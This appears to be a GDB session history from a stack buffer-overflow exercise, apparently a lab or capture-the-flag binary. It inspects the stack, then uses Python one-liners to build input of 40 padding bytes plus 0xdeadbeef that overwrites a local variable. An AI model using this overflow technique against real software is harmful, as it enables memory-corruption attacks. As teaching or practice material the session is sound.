disassemble main
run
break *main+60
run
x/20wx $ebp-0x50
x/wx $ebp-0x1c
x/12wx $ebp-0x44
break *main+60
run
x/4bx $ebp-0x44
x/wx $ebp-0x44
run < /tmp/input
x/wx $ebp-0x1c
continue
shell python3 -c 'open("/tmp/input", "wb").write(b"A"*40 + b"BBBB")'
run < /tmp/input
x/wx $ebp-0x1c
shell python3 -c 'import struct; b=struct.pack("<I", 0xdeadbeef); print(repr(b)); print(b.hex())'
shell python3 -c 'import struct; open("/tmp/input","wb").write(b"A"*40 + struct.pack("<I", 0xdeadbeef))'
run < /tmp/input
x/wx $ebp-0x1c
continue
quit
